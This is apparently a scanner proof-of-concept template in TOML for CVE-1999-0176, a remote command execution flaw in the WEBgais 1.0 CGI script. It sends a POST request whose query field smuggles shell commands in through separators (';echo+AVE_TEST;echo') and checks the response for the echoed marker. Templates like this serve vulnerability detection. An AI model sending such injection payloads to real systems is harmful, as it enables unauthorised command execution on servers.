[info]
author = "ave"
description = "验证 WEBgais 1.0 /cgi-bin/webgais 是否存在远程命令执行漏洞，通过 POST 请求发送特制的 query 参数利用 shell 命令分隔符执行任意命令"
id = "POC-AVE-1999-0351"
name = "WEBgais 1.0 远程命令执行漏洞 PoC"
severity = "high"
tags = ["ave-1999-0351"]
vuln_id = [
    "CVE-1999-0176",
    "AVE-1999-0351",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/webgais"
protocol = "http"

[poc.requests.body]
content = "query=';echo+AVE_TEST;echo'&output=subject&domain=paragraph"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVE_TEST"]
